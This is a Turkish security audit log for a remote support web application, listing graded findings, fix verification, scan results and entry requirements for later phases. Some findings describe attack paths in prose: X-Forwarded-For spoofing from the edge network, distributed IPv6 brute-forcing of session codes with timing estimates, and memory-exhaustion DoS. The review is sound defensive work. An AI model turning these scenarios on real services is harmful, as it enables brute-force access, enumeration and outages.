#### S1-7 [DÜŞÜK] Audit izinli listesi alt nesneleri maskesiz bırakır — A09 (G-15)
Yer: apps/server/src/audit/mask.ts:31
Tehdit: izinli anahtarın (`source`, `reason`, `result`, `action`…) değeri nesne ise içi taranmadan yazılır;
ileride `{ source: body }` gibi bir çağrı şifreyi açık loglar.
Öneri: izinli anahtar yalnız ilkel değerlerde açık; nesne/dizi ise `maskValue(inner)` ile özyinele. Birim test. Atanan: backend-dev

#### S1-8 [DÜŞÜK] E-posta/kullanıcı adı belirsizliği — A07
Yer: apps/server/src/auth/repo.ts:30-35 (`findFirst` + `OR`)
Tehdit: kullanıcı adı başka birinin e-postasına eşit olabilir (iki ayrı UQ) → `findFirst` sırası belirsiz; kilit/sayaç yanlış
hesaba yazılır, meşru kullanıcı giremez. P9'da kullanıcı oluşturma geldiğinde istismar edilebilir.
Öneri: contracts'ta username kalıbı `@` içermesin (`^[a-z0-9._-]{3,60}$`); login `@` içeriyorsa yalnız e-posta, değilse yalnız username ara. Atanan: backend-dev

#### S1-9 [DÜŞÜK] Çerezlerde `__Host-` öneki yok — A05
Yer: packages/contracts/src/api/auth.ts:56-57, apps/server/src/auth/routes.ts:17
Tehdit: K1 sonrası alan adında kardeş alt alan adı çerez enjekte edebilir (CSRF çerezini sabitleme). Origin kontrolü
CSRF'i yine engeller; derinlik savunması. Öneri: `__Host-rs_session`, `__Host-rs_csrf` (path=/, secure, Domain yok — zaten öyle);
web `proxy.ts:9` sabiti contracts'tan alınsın (çift tanım var). Atanan: backend-dev, frontend-dev

#### S1-10 [DÜŞÜK] Yeni girişte eski oturum iptal edilmez; çıkışta CSRF çerezi yoksa çerezler temizlenmez — A07
Yer: apps/server/src/auth/routes.ts:31-43
Öneri: login'de gelen geçerli `rs_session` varsa revoke; logout CSRF hatasında da (403) en azından çerezleri sil. Atanan: backend-dev

#### S1-11 [DÜŞÜK] CI'da gitleaks imajı etiketle sabit — A08 (G-18)
Yer: .github/workflows/ci.yml:136 (`ghcr.io/gitleaks/gitleaks:v8.30.1`)
Öneri: `@sha256:<digest>` ile sabitle (Action'lar SHA'lı, imaj da aynı kurala girsin); Dependabot `docker` zaten açık. Atanan: devops

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **1 orta** — `minimatch` (GHSA-g3hv-75wg-m249, 21 yol; eslint/geliştirme zinciri,
  runtime imajına girmez). Öneri: Dependabot PR'ı / `pnpm.overrides`. Kritik/Yüksek yok.
- gitleaks: yerelde kurulu değil, **çalıştırılamadı**; CI'da tüm geçmiş taranıyor (ci.yml:134). Repo'da commit yok.
- semgrep: kurulu değil. Elle `secret|password|token` taraması: gerçek değer yok; `.env.example` yalnız anahtar adları;
  test sabit parolası `.gitleaks.toml` tek dosya istisnasıyla. `.dockerignore` `.env*`, `.git`, `docs`, `deploy`'u dışlıyor.
- `.env` git geçmişi: commit yok; `.gitignore` `.env*`, `*.pem`, `*.key`, `deploy/turn/*.local.conf` kapsıyor.

### G maddeleri (P1'e ait) karşılanma tablosu
| G | Durum | Kanıt / not |
|---|---|---|
| G-10 (Caddy log) | Karşılandı | Caddyfile:30-43 sorgu, `/session/***`, Cookie, Authorization, X-Csrf-Token, Referer, Set-Cookie, Location, Sec-WebSocket-Protocol siliniyor; pino `maskUrl` + redact (logger.ts:5-23). Kalan: S1-4 |
| G-11 (XFF / ipKey) | Karşılandı | app.ts:76 `trustProxy` = `TRUSTED_PROXY_CIDR`; compose:85 + caddy sabit 172.30.0.2; Caddy `trusted_proxies` yok; prod'da zorunlu (env.ts:29); ip.ts IPv4 /32, IPv6 /64, mapped→v4 |
| G-15 (mask + DB kullanıcıları) | Karşılandı (P1 kapsamı) | mask.ts izinli+kara liste; grants.sql:18-19 audit_logs yalnız SELECT/INSERT; app init'te yetkisiz (01-users.sh:33); server'da MIGRATE_DATABASE_URL yok; check-app-grants.sh. Tetikleyici + fail-closed P11. Kalan: S1-7 |
| G-18 (CI) | Kısmen | Action'lar SHA'lı, `permissions: contents: read`, `--frozen-lockfile`, Dependabot npm/actions/docker. Kalan: S1-11 |
| G-19 (CSP/başlıklar) | Karşılandı | proxy.ts nonce + `strict-dynamic`, `unsafe-inline` yok, `connect-src wss://host:port`, worker/manifest, COOP/CORP, Referrer no-referrer, Permissions-Policy; helmet aynı politika; HSTS `includeSubDomains` yok; `-Server`, `poweredByHeader:false`; `dangerouslySetInnerHTML`/`style=` kullanımı yok |
| G-20 (gizli değer) | Karşılandı | ids.ts 256 bit token, `safeEqual` sabit süreli (özetlenmiş) |
| G-23 (kilit DoS) | Kısmen | Hesap+IP (bellek) + hesap geneli 20/sa (DB) + IP 20/dk tasarıma uygun; bildirim e-postası P10. Kalan: S1-2, S1-5, S1-6 |

### Tasarımda vaat edilip kodda bulunmayanlar
- Hesap geneli kilit "yarışsız" değil (S1-2). Şifre değişiminde oturum iptali tasarımda açık değil; P10 `logout-all` beklemeden eklenmeli (S1-3).
- `tenantScope` P1'de tanımlı ama kullanan tenant verisi ucu yok (beklenen); AC-69 aracı (test/helpers/tenant-matrix.ts) mevcut — her pakette genişletilmeli.

### Olumlu
- Opak 256 bit oturum, DB'de yalnız SHA-256; mutlak 8 sa + boşta 30 dk; her istekte DB doğrulaması; pasif kullanıcı/tenant anında düşer.
- Çerez `HttpOnly`(oturum) + `Secure` + `SameSite=Strict`; double-submit CSRF + **login dahil** Origin allowlist; CORS eklentisi yok.
- argon2id m=19456 KiB, t=2, p=1 (OWASP); kullanıcı yoksa dummy hash ile eşit maliyet; aynı 401 metni; şifre 12-200.
- `must_change_password` sunucu guard'ında (yalnız me/logout/password-change serbest); seed Super Admin'i zorunlu değişimle oluşturuyor, parolayı ezmiyor, prod'da demo tenant yok.
- Hata zarfı stack/SQL sızdırmıyor; `bodyLimit` 64 KB; env hatası değer yazmıyor.
- Docker: non-root `node`, root sahipli salt okunur dosyalar, `read_only`, `cap_drop: ALL`, `no-new-privileges`, MySQL `internal` ağda yayınsız, `/health|/ready|/metrics` dışarı kapalı, `admin off`.

### Ajan bazında
- backend-dev: S1-2, S1-3, S1-5, S1-6, S1-7, S1-8, S1-9 (sunucu), S1-10
- frontend-dev: S1-1, S1-4, S1-9 (proxy.ts sabiti)
- devops: S1-11, `minimatch` güncellemesi

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S1-5..S1-11. S1-1..S1-3 "Sonra" değil, P2 öncesi düzeltme; S1-4 P2 giriş şartı.

## P1 kod turu — Tur 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (yeni). S1-1..S1-11'in 11'i de kapandı.

### S1 doğrulama tablosu
| ID | Sonuç | Kanıt |
|---|---|---|
| S1-1 | Kapandı | web/lib/api.ts:88-113 kontrol karakteri + `\` (ham ve çözülmüş), herhangi bir yerde `//` reddi, son karar `new URL(next, origin).origin` karşılaştırması; login-form.tsx:45 `window.location.origin` geçiyor. `/\t/x`, `%09`, `/%2F/x` reddediliyor |
| S1-2 | Kapandı | repo.ts:40-53 tek ifadeli koşullu `UPDATE` (satır kilidi altında okuma+yazma) → kayıp güncelleme yok. Yan etki: S2-3 |
| S1-3 | Kapandı (kısmen kabul) | service.ts:115-134 diğer oturumlar aynı TX'te iptal; oturum başına 5 hatalı `current` → oturum iptal + 401, sayım doğrulamadan önce. Token yenilenmemesi: S2-2 |
| S1-4 | Kapandı | proxy.ts:11-15 önek eşleşmesi; :43 `next` yalnız pathname, `/session/` hiç yazılmıyor. `/session/` yalnız çerez ön elemesini atlıyor, yetki yine sunucuda (layout `getMe`) |
| S1-5 | Kapandı | olmayan hesap için `ghostAccount` aynı 20/sa kuralını uyguluyor (service.ts:36, :49, :62); kilitli dalda da argon2. Yan etkiler: S2-1, S2-4 |
| S1-6 | Kapandı | service.ts:75 `hit` await'ten önce, senkron |
| S1-7 | Kapandı | mask.ts:31 izinli anahtarın nesne/dizi değeri de `maskValue` ile özyineleniyor |
| S1-8 | Kapandı | repo.ts:31-34 `@` varsa yalnız e-posta, yoksa yalnız username, `findUnique`. Username'de `@` yasağı P9'da contracts'a girmeli (izlenecek) |
| S1-9 | Kapandı | contracts auth.ts:59-60 `__Host-rs_session`, `__Host-rs_csrf`; Secure, Path=/, Domain yok (routes.ts:17); `clearCookie` aynı özniteliklerle (öneki geçerli siler); proxy.ts sabiti contracts'tan |
| S1-10 | Kapandı, gerekçe kabul | routes.ts:39-53 hata durumunda yalnız çerezler temizleniyor, sunucu oturumu iptal edilmiyor. Çapraz siteden gelen yanıttaki SameSite=Strict `Set-Cookie` tarayıcıca uygulanmaz; en kötü sonuç kendi tarayıcıda çıkış. Yeni girişte eski oturum iptal ediliyor (service.ts:94) |
| S1-11 | Kapandı | ci.yml:136 `gitleaks:v8.30.1@sha256:…`; Dockerfile/compose base imajları digest'li; `minimatch` override sonrası `pnpm audit --audit-level=moderate` → **No known vulnerabilities found** (bu turda yeniden çalıştırıldı) |

### Yeni bulgular
#### S2-1 [ORTA] Bellek içi sayaçlarda sınır yok ve temizlik her istekte O(n) — A04 (DoS)
Yer: apps/server/src/lib/rate.ts:33-36, :52-55; yeni tüketici service.ts:36 `ghostAccount` (anahtar = saldırganın seçtiği login, ≤190 karakter, 60 dk pencere)
Tehdit: her rastgele login değeri `ghostAccount`'ta ve `pair`'de (`login|ip`) birer kayıt açar. Kayıt sayısı 10.000'i geçince
`sweep` her `hit`'te tüm haritayı dolaşıyor, ancak 60 dk dolmadığı için hiçbir kaydı silemiyor. IP başına 20/dk ile ~9 IP
10.000 eşiğini aşar; ~1.000 IP ile ~1,2 M kayıt (yüzlerce MB) oluşur ve her giriş isteği olay döngüsünü onlarca ms kilitler.
Sonuç: tüm API yavaşlar, bellek dolar (OOM ile yeniden başlama sayaçları da sıfırlar).
Öneri: `FixedWindowCounter`'a `maxEntries` (ör. 50.000; dolunca en eski kayıt atılır — Map ekleme sırası, LRU) ve zamanlı
temizlik (`setInterval` 60 sn, `unref`) ekle; her `hit`'te tam tarama yapılmasın. `ghostAccount` anahtarı `sha256(login)`
olsun (sabit 64 B). Birim test: 100k farklı anahtarda bellek ve `hit` süresi sınırlı kalmalı. Atanan: backend-dev
#### S2-2 [DÜŞÜK] Şifre değişiminde mevcut oturum token'ı yenilenmiyor — A07
Yer: apps/server/src/auth/service.ts:128-134, routes.ts:55-59
Gerekçenin değerlendirmesi: **kısmen kabul.** Saldırganın ayrı bir oturumu varsa (şifreyi bilen ya da başka cihaz) iptal ediliyor,
bu doğru. Ama token çalınmasında (XSS, zararlı yazılım, ileride log/yanlış yapılandırma) saldırgan kurbanla **aynı** oturumu
paylaşır. Kurban "bir şey ters" diye şifresini değiştirdiğinde bu oturum "diğer" sayılmaz, saldırgan 8 sa'e kadar içeride kalır.
OWASP Session Management önerisi kimlik bilgisi değişiminde oturumun yenilenmesidir. P10 `logout-all` kullanıcının bilinçli
eylemine bağlıdır, otomatik koruma değildir. HttpOnly + 30 dk boşta süresi riski sınırladığı için şiddet Düşük.
Öneri: başarılı değişimde aynı TX'te mevcut oturumu da iptal et, `openSession` ile yeni token + CSRF üret ve `setSessionCookies`
çağır (login'deki kod yolu; ~10 satır). Test: değişimden sonra eski çerezle `/auth/me` → 401, yeni çerezle 200. Atanan: backend-dev
#### S2-3 [DÜŞÜK] Hedef hesapta satır kilidi çekişmesi — A04
Yer: apps/server/src/auth/repo.ts:41-51 (UPDATE + gereksiz `SELECT … FOR UPDATE` + UPDATE, audit INSERT aynı TX'te, service.ts:50-58)
Tehdit: çok IP'den tek hesaba eşzamanlı yanlış şifre gönderilince bütün TX'ler aynı `users` satırında sıraya girer. Her TX kısa
sürdüğü için kilitlenme (deadlock) beklenmez: tek satır, tek sıra. Ancak yüksek hacimde Prisma bağlantı havuzu bekleyen TX'lerle
dolup diğer istekleri de geciktirebilir. IP limiti (20/dk) bunu sınırlıyor.
Öneri: `FOR UPDATE` kaldırılsın (UPDATE zaten satırı kilitler; okuma aynı TX'te düz SELECT ile yeterli) veya eşik kontrolü tek
ifadeye alınsın (`locked_until = IF(count+1 >= limit, …)`); audit INSERT kilitten sonra ayrı yazılabilir. Yük testi: tek hesaba
500 eşzamanlı istekte başka bir kullanıcının girişi p95 < 1 sn kalmalı. Atanan: backend-dev
#### S2-4 [DÜŞÜK] Hayalet hesap sayacı yeniden başlatmada sıfırlanıyor (kabul edilen risk) — A07
Yer: service.ts:36 (bellek) ↔ var olan hesapta DB `locked_until`
Değerlendirme: kilit penceresi içinde süreç yeniden başlarsa var olan hesap 423, olmayan hesap 401 döner; hesabın varlığı
anlaşılabilir. Saldırgan yeniden başlatmayı kendisi tetikleyemez; S2-1 düzelmezse OOM ile tetikleyebilir, dolayısıyla S2-1'e
bağlı. ADR-0005 (tek instance, bellek) ile tutarlı. Ayrıca düzeltme gerekmez, S2-1 ile birlikte kapanır. Atanan: —

### Diğer kontroller (yeni açık yok)
- Boş gövdeli JSON ayrıştırıcısı (app.ts:91-95): dolu gövde Fastify'ın prototip zehirlemesine karşı korumalı varsayılan ayrıştırıcısına gidiyor; boş gövde `undefined` → zod `{}`. Sorun yok.
- Kilitli dalda argon2 çalıştırılması, kilitli hesaba istek yağdırıldığında CPU maliyeti getiriyor; IP limiti 20/dk ile sınırlı ve S1-5 için gerekli. Kabul.
- Şifre değişimi sayacı oturum kimliği anahtarlı; boyutu oturum sayısıyla sınırlı.

### Ajan bazında
- backend-dev: S2-1 (P2 öncesi önerilir: P2/P3 aynı `FixedWindowCounter`'ı public uçlarda kullanacak), S2-2, S2-3
- frontend-dev, devops: yeni bulgu yok

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S2-3, S2-4. S2-1, P2'deki public resolve/join limitlerinden önce kapatılmalı. S2-2 küçük iş, P2 ile birlikte yapılmalı.

## P1 kod turu — Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (S3-1, kabul edilen kalan risk). S2-1, S2-2, S2-3 kapandı; S2-4 S2-1 ile birlikte kapandı.

### S2 doğrulama
| ID | Sonuç | Kanıt |
|---|---|---|
| S2-1 | Kapandı | rate.ts:53-71 `hit` O(1), `maxEntries` 50.000, dolunca en eski kayıt atılıyor; `prune` istek yolunda değil, 30 sn'lik `unref`'li zamanlayıcıda (:34-38, :78-81); `onClose`'da durduruluyor (app.ts:86). Anahtarlar `sha256(login)` (service.ts:51, :64, :75), bellek ≈ 50k × sayaç sayısı × ~200 B, sınırlı |
| S2-2 | Kapandı | service.ts:136-138 mevcut dahil tüm oturumlar iptal, yeni oturumun bitişi eskisininkini aşmıyor; routes.ts:57 yeni `__Host-` oturum + CSRF çerezi. web lib/api.ts CSRF'i her istekte çerezden okuyor, frontend tarafında ek iş yok |
| S2-3 | Kapandı | repo.ts `bumpAccountFailures` tek `UPDATE` (MySQL tek tablo atamaları soldan sağa güncel değerle); `FOR UPDATE` yok. Eşzamanlı ikinci istek pencereyi 1'den başlatıyor ama `locked_until` korunuyor ve kilit kaydı bir kez yazılıyor; kilit sonrası pencere NULL olduğu için sayaç 1'den başlıyor. Doğru |
| S2-4 | Kapandı | OOM tetikleyicisi kalktı; restart'ta sıfırlanma ADR-0005 kapsamında kabul |

### S3-1 [DÜŞÜK] Sınır dolunca etkin kilit kaydı atılabilir — kalan risk KABUL EDİLDİ — A07
Yer: apps/server/src/lib/rate.ts:59-62
Değerlendirme: ~170 IP ile 15 dk'da 50.000 yeni hesap+IP anahtarı üretilirse saldırganın kendi kilit kaydı atılabilir ve hesap+IP
sınırı (5/15 dk) aşılır. Bu tek başına kaba kuvvet denemesine kapı açmıyor, çünkü:
(1) var olan hesapta asıl sınır **DB'deki hesap geneli kilit** (20/sa, artık atomik), bellekteki atma bunu etkilemiyor;
(2) IP sayacı (20/dk) ayrı bir örnek ve anahtarı IP; atılması için ~50.000 IP gerekir;
(3) olmayan hesapta (`ghostAccount`) atma yalnız 423/401 tutarlılığını bozar: düşük değerli numaralandırma, büyük trafik ister.
Sonuç: P1 için kabul edilebilir.
En basit iyileştirme (Sonra, ~5 satır): atarken kilidi etkin olan kaydı atlamak. En eskiden başlayarak en çok 32 kayda bak; ilk
`blockedUntil <= now` olanı sil. Hepsi kilitliyse yeni kaydı ekleme ve isteği "kilitli" say (fail-closed); bu yalnız yoğun
saldırı altında devreye girer. Yük testi: sınır doluyken etkin kilit kaydı korunmalı.
**P2/P3 notu:** public resolve/join limitlerinde DB'de bir yedek sınır yok; bu sınıf orada kullanılırsa iyileştirme o paketin
giriş şartı olsun (G-02).
Atanan: backend-dev (Sonra; P2 public limitlerinden önce)

### P1 güvenlik kapanışı
S1 (11) + S2 (4) bulgunun hepsi kapandı veya gerekçesiyle kabul edildi. Açık Kritik/Yüksek yok → P1 güvenlik açısından **GEÇTİ**.
`docs/gereksinimler.md` §9 "Sonra" önerisi: S3-1 (P2 öncesi), S1-8 username `@` yasağı (P9).

## P2 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 6 (+ P3 giriş şartı notu). Düşüklerin hepsi "Sonra" olabilir; S-P2-3 ve
S-P2-5 P3 öncesinde kapanmalı.

### S3-1 doğrulama (P1'den kalan şart)
Kapandı: `apps/server/src/lib/rate.ts:57-68`, kilidi süren kayıt atılmıyor (en çok 32 kayda bakılıyor), hepsi kilitliyse
`hit` true dönüyor (fail-closed). P2 public limitleri aynı sınıfı kullanıyor (`sessions/public.ts:26-31`).

### Bulgular (öncelik sırasıyla)

#### S-P2-1 [DÜŞÜK] Web, müşteri sayfasında resolve yaparken gelen X-Forwarded-For'u olduğu gibi iletiyor; edge ağından taklit edilebilir — A01/A04
Yer: apps/web/app/session/[token]/page.tsx:26, apps/web/lib/server-api.ts:93, deploy/docker-compose.yml:87 (`TRUSTED_PROXY_CIDR 172.30.0.2/31`)
Sorun: Server `.3`'ü (web) güvenilen proxy sayıyor. Web ise gelen `x-forwarded-for` başlığını doğrulamadan iletiyor.
Caddy'den gelen istekte bu sorun değil: Caddy'de `trusted_proxies` yok, istemcinin gönderdiği XFF eziliyor. Ama web:3000'e
edge ağından doğrudan gelen bir istek istediği IP'yi yazabiliyor.
İstismar senaryosu: Caddy'de RCE bulan ya da edge ağına eklenen bir konteyner, `GET http://172.30.0.3:3000/session/<x>`
isteğini her seferinde farklı `X-Forwarded-For` ile atar. (a) Token yolunun 30/dk/IP sınırı fiilen kalkar. Token 256 bit
olduğu için tahmin yine pratik değil. (b) `session.resolve` audit satırlarına (410 durumları) sahte `ip_address` yazılır.
Kod yolu bu sayfadan geçmediği için 8 haneli kodun kaba kuvvetle denenmesine yol açmıyor. `next.config.ts:16` rewrite'ı
(http-proxy `xfwd`) kendi bağlantı adresini sona eklediği için o yol taklit edilemiyor. Ön koşul edge ağının ele
geçirilmesi olduğundan önem Düşük.
Düzeltme (devops): Edge ağında yalnız caddy, web ve server kalmalı; compose'a "edge'e servis eklenmez" yorumu ve runbook
notu eklenmeli. Kesin çözüm (Sonra): Caddy `reverse_proxy web:3000 { header_up X-Edge-Auth {env.EDGE_SHARED_SECRET} }`.
Web, bu başlık eşleşmezse XFF iletmemeli. Alternatif: web yalnız XFF'in son öğesini iletmeli (taklidi tek değere indirir,
tamamen kaldırmaz).

#### S-P2-2 [DÜŞÜK] Web'den yapılan resolve User-Agent iletmiyor; audit'te `user_agent` boş ya da "node" — A09
Yer: apps/web/lib/server-api.ts:88-93; server tarafı apps/server/src/audit/service.ts:29
Sorun: `session.resolve` (fail/410) ve resolve sırasında yapılan `session.expired` kayıtlarındaki `user_agent`, müşterinin
tarayıcısını değil Node fetch'i gösteriyor. Ortak standart §1.1 bu alanı zorunlu tutuyor.
İstismar senaryosu: Yok. Olay incelemesinde müşteri ile saldırganın istemcisi ayırt edilemiyor.
Düzeltme (frontend-dev): `resolveSessionToken`'a `user-agent` parametresi eklenmeli, `h.get("user-agent")` değeri en çok
512 karaktere kesilip iletilmeli. Bu değer yalnız bilgi amaçlı, güven kararlarında kullanılmamalı.

#### S-P2-3 [DÜŞÜK] Global `resolve_failed` sayacı/alarmı (G-02) kodda yok; dağıtık kod denemesi görünmüyor — A09/A04
Yer: apps/server/src/sessions/public.ts:66-73 (başarısız kod yalnız ip/önek sayacına giriyor; metrik ve log yok); vaat:
docs/mimari.md:179, :338, docs/mimari-api.md:87
Sorun: IP/önek limitleri tek kaynağa karşı doğru çalışıyor. Ama çok sayıda önekten gelen saldırı hiçbir yerde
görünmüyor. Hesap şöyle: /56 başına yaklaşık 30 hata / 16 dk. Tek bir IPv6 /48 (256 adet /56, tunnel broker ile ücretsiz)
dakikada yaklaşık 480 deneme yapar. 100 bekleyen oturumda bir denemenin tutma olasılığı 10⁻⁶, yani /48 başına beklenen
süre yaklaşık 35 saat. Bu süre önek sayısıyla doğrusal kısalır.
İstismar senaryosu: Kodu tutturan saldırgan bugün (P2) `tenant.name`, `technician.name` ve `techVerifyCode` bilgilerini
alıyor (public.ts:87-93). Bunlar hedefli telefon dolandırıcılığı için malzeme. Oturumu ele geçirmek P3'teki lobi ve
`admitCode` kapısına bağlı.
Düzeltme (backend-dev, P3 öncesi): Başarısız kod için süreç içi bir sayaç tutulmalı (`resolve_failed_total`, dakikalık
pencere). Eşik (100/dk) aşılınca `warn` log atılmalı (IP yazılmadan, yalnız sayı ve önek sayısı). /metrics P13'te bu
sayaca bağlanmalı. Engelleme yapılmamalı (G-02: global alarm olarak kalır).

#### S-P2-4 [DÜŞÜK] Önek (/24) kilidi CGNAT arkasındaki müşterileri birlikte kilitleyebilir — A04 (tasarımda kabul edilmiş kalan risk)
Yer: apps/server/src/sessions/public.ts:27-28, :63-71; apps/server/src/lib/ip.ts:24-31
Sorun: Mobil operatör CGNAT'larında binlerce abone aynı /24'ü paylaşıyor. Aynı havuzdaki bir kişi dakikada 31 hatalı kod
girerse o önekteki herkesin kod girişi 15 dk 429 alır. Link (token) yolu etkilenmiyor.
İstismar senaryosu: Rakip ya da kötü niyetli biri aynı operatörün mobil verisinden betik çalıştırır, o bölgedeki
müşteriler kodla bağlanamaz.
Düzeltme (backend-dev/frontend-dev, Sonra): 429 ekranında "Size gönderilen bağlantıyı kullanın" yönlendirmesi olmalı
(guest-ui `rate`). S-P2-3'teki sayaç önek bazında 429 sayısını da raporlamalı. Tasarım değişikliği gerekmiyor.

#### S-P2-5 [DÜŞÜK] Staging'de Caddy'nin gerçek istemci IP'sini gördüğü doğrulanmadı (Docker userland-proxy / IPv6) — A05
Yer: deploy/docker-compose.yml (caddy `ports`, edge ağı yalnız IPv4)
Sorun: IPv4'te iptables DNAT kaynak adresi korur. Ancak host IPv6 dinliyorsa ve ağ yalnız IPv4 ise, Docker
`docker-proxy` (userland-proxy) bağlantıyı aktarır ve tüm IPv6 istemciler `172.30.0.1` olarak görünür. Bu durumda tüm
IP/önek limitleri tek bir ortak kovaya düşer: bir kişinin 10 hatası herkesi 15 dk kilitler.
İstismar senaryosu: IPv6 ile bağlanan saldırgan 11 hatalı kod girer, IPv6 ile gelen tüm müşterilerin kod girişi kilitlenir.
Düzeltme (devops, P3 öncesi): Staging'de `docker compose logs caddy` çıktısında `request.remote_ip` alanı gerçek dış IP
olmalı; IPv4 ve IPv6 ayrı ayrı denenmeli. `172.30.0.1` görünüyorsa iki yol var: ya `"userland-proxy": false` ile birlikte
edge ağında IPv6 açılmalı (`enable_ipv6`), ya da yayın yalnız IPv4'e bağlanmalı (`0.0.0.0:4450:4450`). Sonuç runbook'a yazılmalı.

#### S-P2-6 [DÜŞÜK] Token yolundaki her 410 yanıtı bir audit satırı yazıyor; audit şişirilebilir — A04
Yer: apps/server/src/sessions/public.ts:51-53, :82-85
Sorun: Bitmiş bir oturumun linkine sahip olan herkes, her yenilemede `session.resolve/fail` satırı üretiyor. Sınır
30/dk/IP; birden çok IP ile sınırsız.
İstismar senaryosu: Sızmış eski bir link botnet'e verilir, audit tablosu ve ekranı gürültüyle dolar, gerçek olaylar
kaybolur.
Düzeltme (backend-dev, Sonra): Aynı `entity_id` + `reason` için 10 dk içinde tek satır yazılmalı (bellek içi
`FixedWindowCounter` ile). Ya da 410'lar audit yerine yalnız sayaç/log olarak tutulmalı.

#### S-P2-7 [BİLGİ] Küçük sertleştirmeler
- apps/server/src/env.ts:30: `SESSION_REF_KEY` production'da opsiyonel; zorunluluğu yalnız compose sağlıyor. Compose
  dışında çalıştırılırsa sessizce süreç başına rastgele anahtar üretiliyor. `TRUSTED_PROXY_CIDR`'deki `refine` gibi
  production'da zorunlu yapılmalı (backend-dev).
- apps/web/next.config.ts:15-16: `/api` rewrite production'da da açık; Caddy `/api/*`'yi önce yakaladığı için dışarıdan
  ulaşılamıyor, ama gereksiz bir ikinci yol. `NODE_ENV !== "production"` koşuluna bağlanmalı (frontend-dev).
- Kod yolunda süresi geçmiş ama iş tarafından henüz süpürülmemiş bir kod (≤30 sn) 410 döndürüyor ve başarısız sayılmıyor
  (public.ts:77-80). Etkisi ihmal edilebilir; yalnız kayda geçsin.

### P3 giriş şartları (bu turdan doğan)
1. `sessionRef` süresiz geçerli ve tarayıcı JS'inde/sorgu dizesinde duruyor. P3/P6'da `GET /public/agent/download?ref=`
   dosya adına kodu (`Destek-<kod>.exe`) yazacağı için ref kodla eşdeğer bir gizli değer olur. Bu uç da kod yolu gibi
   limitlenmeli ve yalnız PENDING durumda yanıt vermeli.
2. P3 join/admit: tüketim `UPDATE ... WHERE status='PENDING' AND expires_at > now` tek ifadede yapılmalı, iptal/expiry
   ile yarışta tek kazanan olmalı (P2'deki kalıp, repo.ts:86-101, doğru ve örnek alınmalı).
3. Agent (P6) public resolve'da `Origin` göndermek zorunda (routes.ts:61). Agent için ayrı ve belgelenmiş bir Origin
   değeri ya da `clientKind=AGENT` için Origin muafiyeti kararı verilmeli.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks: bu makinede kurulu değil (CI'da çalışıyor). Yerine regex ile gizli değer taraması yapıldı (node_modules, .next,
  generated, test ve e2e hariç): eşleşme yok. Kökte yalnız `.env.example` var; `SESSION_REF_KEY=` ve
  `TRUSTED_PROXY_CIDR=` boş.
- `git log -- '*.env*'`: dizin git deposu değil, geçmiş taranamadı.

### Tasarımda vaat edilip kodda bulunmayanlar
- G-02 / mimari §338 global `resolve_failed` alarmı: yok (S-P2-3).
- Bunun dışında P2'nin vaat ettiği kontrollerin hepsi kodda bulundu (aşağıda).

### Olumlu
- Token: `randomBytes(32)` base64url, 256 bit (lib/ids.ts:8). DB'de yalnız `sha256` (service.ts:80; CHECK
  `token_hash_fmt_chk`). Düz token yalnız create yanıtında (`link`), `no-store` ile (routes.ts:38); GET/list link döndürmüyor.
- Kod: `randomInt` CSPRNG ile 8 hane. `active_code` UQ global tekil, çakışmada TX 5 kez yeniden deneniyor. CHECK
  `code_pending_chk` sayesinde kod PENDING dışında DB düzeyinde NULL. `toView` PENDING dışında kodu göstermiyor
  (service.ts:35).
- sessionRef: HMAC-SHA256(key, id) + id, `safeEqual` ile sabit süreli ve uzunluk sızdırmayan karşılaştırma
  (codes.ts:21-25, ids.ts:13-15). Biçimsiz veya yanlış ref 404. Status yanıtı yalnız `{status}`.
- Enumeration: kod yolunda yalnız PENDING bulunabiliyor, 404 ile 410 farkı yalnız token sahibine durum bildiriyor (link
  sahibi meşru taraf). Biçimsiz id 404 (routes.ts:25-29).
- Limitler: başarısız kod ip 10/dk + önek 30/dk, 15 dk blok; token 30/dk; status 60/dk. Kontrol DB'ye gitmeden önce yapılıyor.
  Sayaçlar 50k kayıtla sınırlı ve fail-closed.
- Yarış: iptal ve expiry tek koşullu `updateMany` (status='PENDING' + expires_at). Oluşturmada teknisyen satırı
  `FOR UPDATE` ile açık oturum ve saatlik limit serileştiriliyor (repo.ts:37-39).
- Yetki/IDOR: her sorgu `tenantId` kapsamında. USER yalnız kendi oturumunu görüyor (`technicianId` kapsamı filtreyi
  eziyor, repo.ts:73-76). Başka tenant veya başkasının oturumuna GET/cancel 404 dönüyor. Create başka tenant'ta FORBIDDEN
  (service.ts:58). İzinler sessions.create/view/delete (mimari-api ile uyumlu).
- CSRF: teknisyen POST'larında double-submit + Origin (guards.ts:17-22). Public resolve'da Origin allowlist var, çerez
  kullanılmıyor.
- Sızıntı: pino URL'de sorgu dizesini atıyor, `/session/***` maskeleniyor, `*.token` redakte ediliyor (logger.ts).
  Caddy logu sorgu, `/session/…`, Cookie, Referer ve Location alanlarını siliyor. `next=` /session/ yollarına
  yazılmıyor (proxy.ts:43). Sayfada `referrer: no-referrer` ve `noindex`, proxy'de `Referrer-Policy: no-referrer` var.
  Token istemci JS'ine verilmiyor, istemci yalnız ref ile yokluyor.
- SSRF yok: web, sabit `API_INTERNAL_URL`'e regex ile doğrulanmış token'ı JSON gövdede gönderiyor. Link
  `PUBLIC_BASE_URL`'den kuruluyor, Host başlığından değil.
- CSP: nonce + `strict-dynamic`, `unsafe-inline` yok, `frame-ancestors 'none'`, `base-uri 'none'`, `object-src 'none'`.
- DB: `app` kullanıcısında support_sessions için yalnız SELECT/INSERT/UPDATE var, DELETE/DDL yok (grants.sql:18-19).
  CHECK kısıtları durum, ended_at ve TTL (15-30 dk) için ikinci savunma hattı.
- Ağ: web ve server port yayımlamıyor, db ağı `internal`. Güvenilen CIDR /31 tam olarak caddy ve web'i kapsıyor,
  dinamik aralık (.128/25) dışında.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P2-1 (Caddy-web paylaşılan sır), S-P2-2, S-P2-4, S-P2-6, S-P2-7. **P3 öncesi kapanmalı:** S-P2-3, S-P2-5 ve
"P3 giriş şartları" 1-3.

## P2 Tur 2
DURUM: GEÇTİ
